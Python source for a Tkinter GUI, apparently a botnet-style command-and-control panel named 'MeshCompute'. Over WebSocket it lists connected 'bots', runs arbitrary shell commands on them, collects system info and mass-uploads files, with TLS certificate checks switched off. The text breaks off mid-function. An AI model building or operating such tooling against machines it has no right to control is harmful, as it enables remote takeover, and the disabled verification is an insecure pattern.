import asyncio
import json
import os
import base64
import ssl
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from datetime import datetime
import websockets
from dotenv import load_dotenv

load_dotenv()

SERVER_URL = os.getenv("SERVER_URL", "")
AUTH_TOKEN = os.getenv("AUTH_TOKEN", "")

# ── Palette ──────────────────────────────────────────────────────────────────
BG          = "#0b0d12"
BG2         = "#12151e"
BG3         = "#181c28"
BG4         = "#1e2336"
ACCENT      = "#00dda0"
ACCENT2     = "#00b882"
ACCENT_GLOW = "#003d2d"
TEXT        = "#c8d4e8"
TEXT2       = "#7a8aaa"
TEXT3       = "#3d4a62"
RED         = "#ff4d6a"
RED_BG      = "#2a0f15"
YELLOW      = "#f0c040"
BLUE        = "#4da6ff"
BORDER      = "#1e2540"
BORDER2     = "#252d48"

IS_WIN = os.name == "nt"
MONO    = ("Cascadia Code", 11) if IS_WIN else ("Menlo", 11)
MONO_SM = ("Cascadia Code", 10) if IS_WIN else ("Menlo", 10)
MONO_XS = ("Cascadia Code", 9)  if IS_WIN else ("Menlo", 9)
SANS    = ("Segoe UI", 10)      if IS_WIN else ("SF Pro Display", 10)
SANS_SM = ("Segoe UI", 9)       if IS_WIN else ("SF Pro Display", 9)
SANS_LG = ("Segoe UI Semibold", 12) if IS_WIN else ("SF Pro Display", 12)


def ts():
    return datetime.now().strftime("%H:%M:%S")


# ── Controller (unchanged logic) ─────────────────────────────────────────────
class MeshController:
    def __init__(self):
        self.ws = None
        self.connected = False
        self.message_queue = asyncio.Queue()
        self.listener_task = None

    async def connect(self, url, token):
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_2
        self.ws = await websockets.connect(
            url, ssl=ssl_ctx, ping_interval=20, ping_timeout=40, close_timeout=5
        )
        await self.ws.send(json.dumps({"type": "auth", "role": "controller", "token": token}))
        resp = await asyncio.wait_for(self.ws.recv(), timeout=10)
        data = json.loads(resp)
        if data.get("type") != "auth_ok":
            raise Exception("Auth fehlgeschlagen: " + resp)
        self.connected = True
        self.listener_task = asyncio.create_task(self._listen())

    async def disconnect(self):
        self.connected = False
        if self.listener_task:
            self.listener_task.cancel()
        if self.ws:
            await self.ws.close()

    async def _listen(self):
        try:
            while self.connected:
                raw = await self.ws.recv()
                await self.message_queue.put(raw)
        except (asyncio.CancelledError, websockets.exceptions.ConnectionClosed):
            self.connected = False
        except Exception:
            self.connected = False

    async def _wait(self, expected=None, timeout=15):
        try:
            while True:
                raw = await asyncio.wait_for(self.message_queue.get(), timeout=timeout)
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                if expected is None:
                    return data
                if data.get("type") == expected:
                    return data
                if data.get("type") == "bot_response":
                    payload = data.get("payload", {})
                    if payload.get("type") == expected:
                        return payload
        except asyncio.TimeoutError:
            return None

    async def cmd_list(self):
        await self.ws.send(json.dumps({"type": "list"}))
        return await self._wait("list_response")

    async def cmd_exec(self, bot_id, command):
        await self.ws.send(json.dumps({"type": "exec", "target": bot_id, "command": command}))
        return await self._wait("exec_result")

    async def cmd_sysinfo(self, bot_id):
        await self.ws.send(json.dumps({"type": "sysinfo", "target": bot_id}))
        return await self._wait("sysinfo_result")

    async def cmd_upload(self, bot_id, filepath):
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            b64 = base64.b64encode(f.read()).decode("utf-8")
        await self.ws.send(json.dumps({
            "type": "upload", "target": bot_id, "filename": filename, "data": b64
        }))
        return await self._wait("upload_result")


# ── Helpers ───────────────────────────────────────────────────────────────────
def make_sep(parent, horizontal=True, color=BORDER, pad=0, row=None, col=0, colspan=1):
    f = tk.Frame(parent, bg=color,
                 height=1 if horizontal else 0,
                 width=0 if horizontal else 1)
    if row is not None:
        f.grid(row=row, column=col, columnspan=colspan, sticky="ew" if horizontal else "ns")
    elif horizontal:
        f.pack(fill=tk.X, padx=pad)
    else:
        f.pack(fill=tk.Y, pady=pad)
    return f


def pill_label(parent, text, fg=ACCENT, bg=ACCENT_GLOW, font=None):
    return tk.Label(parent, text=text, fg=fg, bg=bg,
                    font=font or MONO_XS,
                    padx=7, pady=2)


# ── Main App ──────────────────────────────────────────────────────────────────
class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("MeshCompute Controller")
        self.geometry("1160x740")
        self.minsize(900, 580)
        self.configure(bg=BG)

        self.ctrl = MeshController()
        self.loop = asyncio.new_event_loop()
        threading.Thread(target=self._run_loop, daemon=True).start()

        self._selected_bot = tk.StringVar(value="")
        self._bot_list = []
        self._cmd_history = []
        self._hist_idx = -1

        self._build_ui()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def _run(self, coro):
        return asyncio.run_coroutine_threadsafe(coro, self.loop)

    # ─── UI skeleton ─────────────────────────────────────────────────────────

    def _build_ui(self):
        self._build_titlebar()

        body = tk.PanedWindow(self, orient=tk.HORIZONTAL, bg=BG,
                              sashwidth=5, sashrelief=tk.FLAT, bd=0,
                              sashpad=0)
        body.pack(fill=tk.BOTH, expand=True)

        self._build_sidebar(body)
        self._build_main(body)

    # ─── Titlebar ─────────────────────────────────────────────────────────────

    def _build_titlebar(self):
        bar = tk.Frame(self, bg=BG2, height=52)
        bar.pack(fill=tk.X)
        bar.pack_propagate(False)

        # left: logo
        logo_frame = tk.Frame(bar, bg=BG2)
        logo_frame.pack(side=tk.LEFT, padx=(16, 0), pady=10)

        hex_lbl = tk.Label(logo_frame, text="⬡", font=("Arial", 18),
                           fg=ACCENT, bg=BG2)
        hex_lbl.pack(side=tk.LEFT)

        name_lbl = tk.Label(logo_frame, text=" MeshCompute", font=SANS_LG,
                            fg=TEXT, bg=BG2)
        name_lbl.pack(side=tk.LEFT)

        ver_lbl = tk.Label(logo_frame, text=" v2", font=SANS_SM,
                           fg=TEXT3, bg=BG2)
        ver_lbl.pack(side=tk.LEFT, pady=(4, 0))

        # right: status badge
        status_frame = tk.Frame(bar, bg=BG3, padx=12, pady=0)
        status_frame.pack(side=tk.RIGHT, padx=16, pady=12)

        self.status_dot = tk.Label(status_frame, text="●", font=("Arial", 10),
                                   fg=RED, bg=BG3)
        self.status_dot.pack(side=tk.LEFT)

        self.status_lbl = tk.Label(status_frame, text="  Getrennt",
                                   font=MONO_XS, fg=TEXT2, bg=BG3)
        self.status_lbl.pack(side=tk.LEFT)

        # time display
        self.clock_lbl = tk.Label(bar, text="", font=MONO_XS, fg=TEXT3, bg=BG2)
        self.clock_lbl.pack(side=tk.RIGHT, padx=(0, 8), pady=16)
        self._tick_clock()

        make_sep(self, color=BORDER2)

    def _tick_clock(self):
        self.clock_lbl.configure(text=datetime.now().strftime("%Y-%m-%d  %H:%M:%S"))
        self.after(1000, self._tick_clock)

    # ─── Sidebar ──────────────────────────────────────────────────────────────

    def _build_sidebar(self, parent):
        side = tk.Frame(parent, bg=BG2, width=240)
        parent.add(side, minsize=200)

        # ── Connection section
        self._sidebar_section(side, "VERBINDUNG")

        info_frame = tk.Frame(side, bg=BG2)
        info_frame.pack(fill=tk.X, padx=14, pady=(0, 10))

        self._info_row(info_frame, "Server", SERVER_URL or "wss://…")
        self._info_row(info_frame, "Token",
                       ("●●●●●●●● " + AUTH_TOKEN[-4:]) if len(AUTH_TOKEN) > 4 else "—")

        self.conn_btn = self._accent_btn(side, "⚡  Verbinden", self._connect)
        self.conn_btn.pack(fill=tk.X, padx=14, pady=(0, 14))

        make_sep(side, color=BORDER, pad=0)

        # ── Bots section
        self._sidebar_section(side, "AKTIVE BOTS")

        self.bot_count_lbl = tk.Label(side, text="0 online",
                                      font=MONO_XS, fg=TEXT3, bg=BG2, anchor="e")
        self.bot_count_lbl.place(relx=1.0, rely=0, anchor="ne", x=-14, y=62)

        list_frame = tk.Frame(side, bg=BG3, highlightthickness=1,
                              highlightbackground=BORDER)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=14, pady=(0, 8))

        sb = tk.Scrollbar(list_frame, bg=BG3, troughcolor=BG3,
                          bd=0, highlightthickness=0, width=6)
        sb.pack(side=tk.RIGHT, fill=tk.Y)

        self.bot_lb = tk.Listbox(
            list_frame, bg=BG3, fg=TEXT, font=MONO_XS,
            bd=0, highlightthickness=0,
            selectbackground=ACCENT2, selectforeground=BG,
            activestyle="none", yscrollcommand=sb.set,
            cursor="hand2", relief=tk.FLAT
        )
        self.bot_lb.pack(fill=tk.BOTH, expand=True, padx=2)
        sb.config(command=self.bot_lb.yview)
        self.bot_lb.bind("<<ListboxSelect>>", self._on_bot_select)

        self._ghost_btn(side, "↻  Aktualisieren", self._refresh_bots).pack(
            fill=tk.X, padx=14, pady=(0, 14))

    def _sidebar_section(self, parent, title):
        f = tk.Frame(parent, bg=BG2)
        f.pack(fill=tk.X, padx=14, pady=(14, 6))
        tk.Label(f, text=title, font=("Arial", 7, "bold"),
                 fg=TEXT3, bg=BG2, anchor="w"
                 ).pack(side=tk.LEFT)

    def _info_row(self, parent, key, val):
        row = tk.Frame(parent, bg=BG2)
        row.pack(fill=tk.X, pady=2)
        tk.Label(row, text=key, font=SANS_SM, fg=TEXT3, bg=BG2,
                 width=7, anchor="w").pack(side=tk.LEFT)
        tk.Label(row, text=val, font=MONO_XS, fg=TEXT2, bg=BG2,
                 anchor="w").pack(side=tk.LEFT, fill=tk.X, expand=True)

    # ─── Main area ────────────────────────────────────────────────────────────

    def _build_main(self, parent):
        main = tk.Frame(parent, bg=BG)
        parent.add(main, minsize=600)

        # custom tab bar
        self.tab_bar = tk.Frame(main, bg=BG2, height=44)
        self.tab_bar.pack(fill=tk.X)
        self.tab_bar.pack_propagate(False)
        make_sep(main, color=BORDER2)

        self.tab_content = tk.Frame(main, bg=BG)
        self.tab_content.pack(fill=tk.BOTH, expand=True)

        self._tabs = {}
        self._tab_btns = {}
        self._active_tab = None

        self._add_tab("terminal", "  ⌨  Terminal  ", self._build_terminal)
        self._add_tab("sysinfo",  "  ◉  Sysinfo   ", self._build_sysinfo)
        self._add_tab("upload",   "  ↑  Upload    ", self._build_upload)
        self._add_tab("log",      "  ≡  Log       ", self._build_log)

        self._switch_tab("terminal")

    def _add_tab(self, key, label, builder):
        content = tk.Frame(self.tab_content, bg=BG)
        builder(content)
        self._tabs[key] = content

        btn = tk.Label(self.tab_bar, text=label, font=MONO_XS,
                       fg=TEXT2, bg=BG2, cursor="hand2", pady=0,
                       padx=4)
        btn.pack(side=tk.LEFT)
        btn.bind("<Button-1>", lambda e, k=key: self._switch_tab(k))
        self._tab_btns[key] = btn

    def _switch_tab(self, key):
        if self._active_tab:
            self._tabs[self._active_tab].pack_forget()
            self._tab_btns[self._active_tab].configure(
                fg=TEXT2, bg=BG2,
                relief=tk.FLAT
            )
        self._active_tab = key
        self._tabs[key].pack(fill=tk.BOTH, expand=True)
        self._tab_btns[key].configure(fg=ACCENT, bg=BG3)

    # ─── Terminal tab ─────────────────────────────────────────────────────────

    def _build_terminal(self, parent):
        parent.rowconfigure(0, weight=1)
        parent.rowconfigure(1, weight=0)
        parent.columnconfigure(0, weight=1)

        # output area
        out_frame = tk.Frame(parent, bg=BG)
        out_frame.grid(row=0, column=0, sticky="nsew")

        self.term_out = tk.Text(
            out_frame, bg=BG, fg=TEXT, font=MONO,
            bd=0, highlightthickness=0,
            insertbackground=ACCENT, state=tk.DISABLED,
            wrap=tk.WORD, padx=16, pady=12,
            spacing1=2, spacing3=2, cursor="arrow"
        )
        vsb = tk.Scrollbar(out_frame, bg=BG, troughcolor=BG2,
                           bd=0, highlightthickness=0, width=6)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.term_out.pack(fill=tk.BOTH, expand=True)
        vsb.config(command=self.term_out.yview)
        self.term_out.config(yscrollcommand=vsb.set)

        # tags
        self.term_out.tag_config("ts",      foreground=TEXT3,  font=MONO_XS)
        self.term_out.tag_config("bot",     foreground=ACCENT, font=MONO_XS)
        self.term_out.tag_config("prompt",  foreground=YELLOW, font=MONO)
        self.term_out.tag_config("output",  foreground=TEXT,   font=MONO)
        self.term_out.tag_config("error",   foreground=RED,    font=MONO)
        self.term_out.tag_config("info",    foreground=BLUE,   font=MONO_XS)
        self.term_out.tag_config("divider", foreground=TEXT3,  font=MONO_XS)

        sep = tk.Frame(parent, bg=BORDER2, height=1)
        sep.grid(row=1, column=0, sticky="ew")

        # input row
        inp = tk.Frame(parent, bg=BG2)
        inp.grid(row=2, column=0, sticky="ew")
        parent.rowconfigure(1, weight=0)
        parent.rowconfigure(2, weight=0)

        # active bot badge on the left
        self.term_bot_badge = tk.Label(
            inp, text="  kein bot  ", font=MONO_XS,
            fg=TEXT3, bg=BG3, padx=10, pady=10
        )
        self.term_bot_badge.pack(side=tk.LEFT)

        tk.Label(inp, text="$", font=MONO, fg=ACCENT,
                 bg=BG2, padx=8).pack(side=tk.LEFT)

        self.term_input = tk.Entry(
            inp, font=MONO, fg=TEXT, bg=BG2,
            bd=0, highlightthickness=0,
            insertbackground=ACCENT, relief=tk.FLAT
        )
        self.term_input.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=10)
        self.term_input.bind("<Return>", self._exec_cmd)
        self.term_input.bind("<Up>",     self._hist_up)
        self.term_input.bind("<Down>",   self._hist_down)

        self._accent_btn(inp, "Run", self._exec_cmd, padx=14).pack(
            side=tk.RIGHT, pady=8, padx=10)

        self._term_write("info", f"MeshCompute Terminal bereit — {datetime.now().strftime('%Y-%m-%d')}\n")

    def _hist_up(self, _e=None):
        if not self._cmd_history:
            return
        self._hist_idx = max(0, self._hist_idx - 1)
        self.term_input.delete(0, tk.END)
        self.term_input.insert(0, self._cmd_history[self._hist_idx])

    def _hist_down(self, _e=None):
        if not self._cmd_history:
            return
        self._hist_idx = min(len(self._cmd_history) - 1, self._hist_idx + 1)
        self.term_input.delete(0, tk.END)
        self.term_input.insert(0, self._cmd_history[self._hist_idx])

    # ─── Sysinfo tab ─────────────────────────────────────────────────────────

    def _build_sysinfo(self, parent):
        parent.columnconfigure(0, weight=1)
        parent.rowconfigure(1, weight=1)

        toolbar = tk.Frame(parent, bg=BG2)
        toolbar.grid(row=0, column=0, sticky="ew")
        tk.Frame(parent, bg=BORDER2, height=1).grid(row=1, column=0, sticky="ew")
        parent.rowconfigure(2, weight=1)

        self._accent_btn(toolbar, "⟳  Sysinfo abrufen", self._fetch_sysinfo).pack(
            side=tk.LEFT, padx=14, pady=10)
        self.sys_bot_lbl = tk.Label(toolbar, text="", font=MONO_XS,
                                    fg=TEXT2, bg=BG2)
        self.sys_bot_lbl.pack(side=tk.LEFT, padx=4)

        canvas_frame = tk.Frame(parent, bg=BG)
        canvas_frame.grid(row=2, column=0, sticky="nsew")

        self.sys_canvas = tk.Canvas(canvas_frame, bg=BG, bd=0,
                                    highlightthickness=0)
        sys_vsb = tk.Scrollbar(canvas_frame, bg=BG, troughcolor=BG2,
                               bd=0, highlightthickness=0, width=6,
                               command=self.sys_canvas.yview)
        self.sys_canvas.configure(yscrollcommand=sys_vsb.set)
        sys_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.sys_canvas.pack(fill=tk.BOTH, expand=True)

        self.sys_inner = tk.Frame(self.sys_canvas, bg=BG)
        self.sys_canvas_win = self.sys_canvas.create_window(
            (0, 0), window=self.sys_inner, anchor="nw")
        self.sys_inner.bind("<Configure>",
            lambda e: self.sys_canvas.configure(
                scrollregion=self.sys_canvas.bbox("all")))
        self.sys_canvas.bind("<Configure>",
            lambda e: self.sys_canvas.itemconfig(
                self.sys_canvas_win, width=e.width))

        self._sys_placeholder()

    def _sys_placeholder(self):
        for w in self.sys_inner.winfo_children():
            w.destroy()
        tk.Label(self.sys_inner,
                 text="\n\n⊙  Bot auswählen, dann 'Sysinfo abrufen'\n",
                 fg=TEXT3, bg=BG, font=MONO_SM).pack(pady=40)

    # ─── Upload tab ──────────────────────────────────────────────────────────

    def _build_upload(self, parent):
        parent.columnconfigure(0, weight=1)
        parent.rowconfigure(0, weight=1)

        outer = tk.Frame(parent, bg=BG)
        outer.grid(row=0, column=0, sticky="nsew")
        outer.columnconfigure(0, weight=1)
        outer.columnconfigure(1, weight=0)
        outer.rowconfigure(0, weight=1)

        # ── Left: settings card ──────────────────────────────────────────────
        card = tk.Frame(outer, bg=BG3, highlightthickness=1, highlightbackground=BORDER2)
        card.grid(row=0, column=0, padx=(40, 16), pady=40, sticky="new")
        card.columnconfigure(1, weight=1)

        tk.Label(card, text="Datei hochladen", font=SANS_LG,
                 fg=TEXT, bg=BG3).grid(row=0, column=0, columnspan=2,
                                        sticky="w", padx=20, pady=(20, 16))
        tk.Frame(card, bg=BORDER, height=1).grid(row=1, column=0, columnspan=2, sticky="ew")

        # Datei
        tk.Label(card, text="Datei", font=SANS_SM, fg=TEXT2,
                 bg=BG3, anchor="w").grid(row=2, column=0, columnspan=2,
                                          sticky="w", padx=20, pady=(14, 4))
        file_row = tk.Frame(card, bg=BG3)
        file_row.grid(row=3, column=0, columnspan=2, padx=20, pady=(0, 14), sticky="ew")

        self._up_file = tk.StringVar(value="Keine Datei gewählt")
        self._up_filepath = ""

        tk.Label(file_row, textvariable=self._up_file, font=MONO_XS, fg=TEXT2,
                 bg=BG4, anchor="w", padx=10,
                 highlightthickness=1, highlightbackground=BORDER2
                 ).pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8)
        self._ghost_btn(file_row, "Wählen…", self._pick_file).pack(side=tk.RIGHT, padx=(6, 0))

        # Buttons
        btn_row = tk.Frame(card, bg=BG3)
        btn_row.grid(row=4, column=0, columnspan=2, padx=20, pady=(4, 8), sticky="w")
        self._accent_btn(btn_row, "⬆  Hochladen", self._upload_file).pack(side=tk.LEFT)
        self._ghost_btn(btn_row, "Alle auswählen", self._select_all_bots).pack(side=tk.LEFT, padx=(8, 0))
        self._ghost_btn(btn_row, "Alle abwählen",  self._deselect_all_bots).pack(side=tk.LEFT, padx=(4, 0))

        self.up_status = tk.Label(card, text="", font=MONO_XS,
                                  fg=ACCENT, bg=BG3, anchor="w")
        self.up_status.grid(row=5, column=0, columnspan=2, padx=20, pady=(0, 16), sticky="w")

        # ── Right: bot checklist ─────────────────────────────────────────────
        right_panel = tk.Frame(outer, bg=BG2, highlightthickness=1, highlightbackground=BORDER2)
        right_panel.grid(row=0, column=1, padx=(0, 40), pady=40, sticky="nsew")
        outer.columnconfigure(1, minsize=200)

        tk.Label(right_panel, text="ZIEL-BOTS", font=("Arial", 7, "bold"),
                 fg=TEXT3, bg=BG2, anchor="w").pack(fill=tk.X, padx=14, pady=(14, 6))
        tk.Frame(right_panel, bg=BORDER, height=1).pack(fill=tk.X)

        scroll_frame = tk.Frame(right_panel, bg=BG2)
        scroll_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        vsb = tk.Scrollbar(scroll_frame, bg=BG2, troughcolor=BG2,
                           bd=0, highlightthickness=0, width=6)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        self.up_bot_canvas = tk.Canvas(scroll_frame, bg=BG2, bd=0,
                                       highlightthickness=0,
                                       yscrollcommand=vsb.set)
        self.up_bot_canvas.pack(fill=tk.BOTH, expand=True)
        vsb.config(command=self.up_bot_canvas.yview)

        self.up_bot_inner = tk.Frame(self.up_bot_canvas, bg=BG2)
        self._up_bot_cwin = self.up_bot_canvas.create_window(
            (0, 0), window=self.up_bot_inner, anchor="nw")
        self.up_bot_inner.bind("<Configure>", lambda e: self.up_bot_canvas.configure(
            scrollregion=self.up_bot_canvas.bbox("all")))
        self.up_bot_canvas.bind("<Configure>", lambda e: self.up_bot_canvas.itemconfig(
            self._up_bot_cwin, width=e.width))

        self._up_bot_vars = {}   # bot_id → BooleanVar
        self._up_bot_checks = {} # bot_id → Checkbutton widget
        self._refresh_upload_bots()

    def _refresh_upload_bots(self):
        for w in self.up_bot_inner.winfo_children():
            w.destroy()
        self._up_bot_vars.clear()
        self._up_bot_checks.clear()

        if not self._bot_list:
            tk.Label(self.up_bot_inner, text="\n  Keine Bots\n",
                     fg=TEXT3, bg=BG2, font=MONO_XS).pack()
            return

        for bot in self._bot_list:
            var = tk.BooleanVar(value=True)
            self._up_bot_vars[bot] = var
            cb = tk.Checkbutton(
                self.up_bot_inner, text=f"  {bot}",
                variable=var, font=MONO_XS,
                fg=TEXT, bg=BG2, selectcolor=BG3,
                activebackground=BG2, activeforeground=ACCENT,
                highlightthickness=0, bd=0,
                anchor="w", cursor="hand2"
            )
            cb.pack(fill=tk.X, padx=8, pady=2)
            self._up_bot_checks[bot] = cb

    def _select_all_bots(self):
        for var in self._up_bot_vars.values():
            var.set(True)

    def _deselect_all_bots(self):
        for var in self._up_bot_vars.values():
            var.set(False)

    # ─── Log tab ─────────────────────────────────────────────────────────────

    def _build_log(self, parent):
        parent.rowconfigure(0, weight=1)
        parent.columnconfigure(0, weight=1)

        self.log_out = tk.Text(
            parent, bg=BG, fg=TEXT2, font=MONO_XS,
            bd=0, highlightthickness=0,
            state=tk.DISABLED, wrap=tk.WORD,
            padx=16, pady=12, spacing1=2
        )
        log_vsb = tk.Scrollbar(parent, bg=BG, troughcolor=BG2,
                               bd=0, highlightthickness=0, width=6)
        log_vsb.grid(row=0, column=1, sticky="ns")
        self.log_out.configure(yscrollcommand=log_vsb.set)
        log_vsb.config(command=self.log_out.yview)
        self.log_out.grid(row=0, column=0, sticky="nsew")

        self.log_out.tag_config("ok",   foreground=ACCENT)
        self.log_out.tag_config("err",  foreground=RED)
        self.log_out.tag_config("info", foreground=BLUE)
        self.log_out.tag_config("ts",   foreground=TEXT3)

        tk.Frame(parent, bg=BORDER2, height=1).grid(row=1, column=0, columnspan=2, sticky="ew")
        bar = tk.Frame(parent, bg=BG2)
        bar.grid(row=2, column=0, columnspan=2, sticky="ew")
        self._ghost_btn(bar, "Log leeren", self._log_clear).pack(side=tk.RIGHT, padx=12, pady=6)

    # ─── Shared button helpers ────────────────────────────────────────────────

    def _accent_btn(self, parent, text, cmd, padx=10):
        b = tk.Button(
            parent, text=text, command=cmd,
            font=MONO_XS, fg=BG, bg=ACCENT,
            activebackground=ACCENT2, activeforeground=BG,
            bd=0, highlightthickness=0, relief=tk.FLAT,
            cursor="hand2", pady=7, padx=padx
        )
        b.bind("<Enter>", lambda e: b.configure(bg=ACCENT2))
        b.bind("<Leave>", lambda e: b.configure(bg=ACCENT))
        return b

    def _ghost_btn(self, parent, text, cmd):
        b = tk.Button(
            parent, text=text, command=cmd,
            font=MONO_XS, fg=TEXT2, bg=BG4,
            activebackground=BORDER2, activeforeground=TEXT,
            bd=0, highlightthickness=1,
            highlightbackground=BORDER, highlightcolor=ACCENT,
            relief=tk.FLAT, cursor="hand2", pady=6, padx=10
        )
        b.bind("<Enter>", lambda e: b.configure(fg=TEXT, bg=BG4))
        b.bind("<Leave>", lambda e: b.configure(fg=TEXT2, bg=BG4))
        return b

    # ─── Output helpers ───────────────────────────────────────────────────────

    def _term_write(self, tag, text):
        self.term_out.configure(state=tk.NORMAL)
        self.term_out.insert(tk.END, text, tag)
        self.term_out.configure(state=tk.DISABLED)
        self.term_out.see(tk.END)

    def _log_write(self, text, tag="info"):
        self.log_out.configure(state=tk.NORMAL)
        self.log_out.insert(tk.END, f"[{ts()}]  ", "ts")
        self.log_out.insert(tk.END, text + "\n", tag)
        self.log_out.configure(state=tk.DISABLED)
        self.log_out.see(tk.END)

    def _log_clear(self):
        self.log_out.configure(state=tk.NORMAL)
        self.log_out.delete("1.0", tk.END)
        self.log_out.configure(state=tk.DISABLED)

    # ─── Status ───────────────────────────────────────────────────────────────

    def _set_status(self, connected, text=""):
        col = ACCENT if connected else RED
        lbl = text or ("Verbunden" if connected else "Getrennt")
        self.status_dot.configure(fg=col)
        self.status_lbl.configure(text=f"  {lbl}", fg=col if connected else TEXT2)
        if hasattr(self, "conn_btn"):
            if connected:
                self.conn_btn.configure(text="✕  Trennen", command=self._disconnect,
                                        bg=RED_BG, fg=RED,
                                        activebackground="#3a1020", activeforeground=RED)
                self.conn_btn.unbind("<Enter>")
                self.conn_btn.unbind("<Leave>")
                self.conn_btn.bind("<Enter>", lambda e: self.conn_btn.configure(bg="#3a1020"))
                self.conn_btn.bind("<Leave>", lambda e: self.conn_btn.configure(bg=RED_BG))
            else:
                self.conn_btn.configure(text="⚡  Verbinden", command=self._connect,
                                        bg=ACCENT, fg=BG,
                                        activebackground=ACCENT2, activeforeground=BG)
                self.conn_btn.unbind("<Enter>")
                self.conn_btn.unbind("<Leave>")
                self.conn_btn.bind("<Enter>", lambda e: self.conn_btn.configure(bg=ACCENT2))
                self.conn_btn.bind("<Leave>", lambda e: self.conn_btn.configure(bg=ACCENT))

    # ─── Actions ─────────────────────────────────────────────────────────────

    def _connect(self):
        from tkinter.simpledialog import askstring
        url   = SERVER_URL or askstring("Server URL", "wss://…", parent=self)
        token = AUTH_TOKEN or askstring("Auth Token", "", parent=self)
        if not url or not token:
            return
        self._set_status(False, "Verbinde…")
        self._log_write(f"Verbinde → {url}", "info")

        def do():
            try:
                self._run(self.ctrl.connect(url, token)).result(timeout=15)
                self.after(0, lambda: self._set_status(True))
                self.after(0, lambda: self._log_write("Authentifiziert ✓", "ok"))
                self.after(0, self._refresh_bots)
            except Exception as e:
                self.after(0, lambda: self._set_status(False))
                self.after(0, lambda: self._log_write(f"Verbindung fehlgeschlagen: {e}", "err"))
                self.after(0, lambda: messagebox.showerror("Fehler", str(e)))

        threading.Thread(target=do, daemon=True).start()

    def _disconnect(self):
        def do():
            try:
                self._run(self.ctrl.disconnect()).result(timeout=5)
            except Exception:
                pass
            self.after(0, lambda: self._set_status(False))
            self.after(0, lambda: self._update_bot_list([]))
            self.after(0, lambda: self._log_write("Verbindung getrennt.", "info"))
        threading.Thread(target=do, daemon=True).start()

    def _refresh_bots(self):
        if not self.ctrl.connected:
            self._log_write("Nicht verbunden.", "err")
            return

        def do():
            try:
                resp = self._run(self.ctrl.cmd_list()).result(timeout=15)
                bots = resp.get("bots", []) if resp else []
                self.after(0, lambda: self._update_bot_list(bots))
                self.after(0, lambda: self._log_write(f"{len(bots)} Bot(s) online", "ok"))
            except Exception as e:
                self.after(0, lambda: self._log_write(f"list-Fehler: {e}", "err"))

        threading.Thread(target=do, daemon=True).start()

    def _update_bot_list(self, bots):
        self._bot_list = bots
        self.bot_lb.delete(0, tk.END)
        for b in bots:
            self.bot_lb.insert(tk.END, f"  {b}")
        self.bot_count_lbl.configure(
            text=f"{len(bots)} online",
            fg=ACCENT if bots else TEXT3
        )
        if hasattr(self, "_up_bot_vars"):
            self._refresh_upload_bots()

    def _on_bot_select(self, _e=None):
        sel = self.bot_lb.curselection()
        if sel:
            bot = self.bot_lb.get(sel[0]).strip()
            self._selected_bot.set(bot)
            self.term_bot_badge.configure(text=f"  {bot}  ", fg=ACCENT, bg=ACCENT_GLOW)
            self.sys_bot_lbl.configure(text=f"→ {bot}")

    def _current_bot(self):
        return self._selected_bot.get()

    # ─── Terminal execute ─────────────────────────────────────────────────────

    def _exec_cmd(self, _e=None):
        cmd = self.term_input.get().strip()
        if not cmd:
            return
        bot = self._current_bot()
        if not bot:
            self._term_write("error", f"  ⚠  Kein Bot ausgewählt\n")
            return
        if not self.ctrl.connected:
            self._term_write("error", f"  ⚠  Nicht verbunden\n")
            return

        self._cmd_history.append(cmd)
        self._hist_idx = len(self._cmd_history)
        self.term_input.delete(0, tk.END)

        self._term_write("ts",     f"\n  {ts()}  ")
        self._term_write("bot",    f"{bot}")
        self._term_write("prompt", f"  $ {cmd}\n")
        self._term_write("divider", "  " + "─" * 60 + "\n")

        def do():
            try:
                resp = self._run(self.ctrl.cmd_exec(bot, cmd)).result(timeout=20)
                if resp and "output" in resp:
                    out = resp["output"].strip()
                    self.after(0, lambda: self._term_write("output", f"  {out}\n"))
                    self.after(0, lambda: self._log_write(f"exec '{cmd}' auf {bot} → OK", "ok"))
                else:
                    self.after(0, lambda: self._term_write("info", "  (keine Ausgabe)\n"))
            except Exception as e:
                self.after(0, lambda: self._term_write("error", f"  Fehler: {e}\n"))
                self.after(0, lambda: self._log_write(f"exec-Fehler: {e}", "err"))

        threading.Thread(target=do, daemon=True).start()

    # ─── Sysinfo ─────────────────────────────────────────────────────────────

    def _fetch_sysinfo(self):
        bot = self._current_bot()
        if not bot:
            messagebox.showwarning("Kein Bot", "Bot in der Liste auswählen.")
            return
        if not self.ctrl.connected:
            messagebox.showwarning("Getrennt", "Nicht verbunden.")
            return

        def do():
            try:
                resp = self._run(self.ctrl.cmd_sysinfo(bot)).result(timeout=20)
                if resp and "info" in resp:
                    info = resp["info"]
                    if isinstance(info, str):
                        try:
                            info = json.loads(info)
                        except Exception:
                            info = {"raw": info}
                    self.after(0, lambda: self._render_sysinfo(bot, info))
                    self.after(0, lambda: self._log_write(f"sysinfo {bot} → OK", "ok"))
                else:
                    self.after(0, lambda: self._log_write("Keine Sysinfo.", "err"))
            except Exception as e:
                self.after(0, lambda: self._log_write(f"sysinfo-Fehler: {e}", "err"))

        threading.Thread(target=do, daemon=True).start()

    def _render_sysinfo(self, bot_id, info: dict):
        for w in self.sys_inner.winfo_children():
            w.destroy()

        # header
        hdr = tk.Frame(self.sys_inner, bg=BG)
        hdr.pack(fill=tk.X, padx=20, pady=(20, 12))

        tk.Label(hdr, text="●", font=("Arial", 10), fg=ACCENT, bg=BG
                 ).pack(side=tk.LEFT, padx=(0, 8))
        tk.Label(hdr, text=bot_id, font=SANS_LG, fg=TEXT, bg=BG
                 ).pack(side=tk.LEFT)
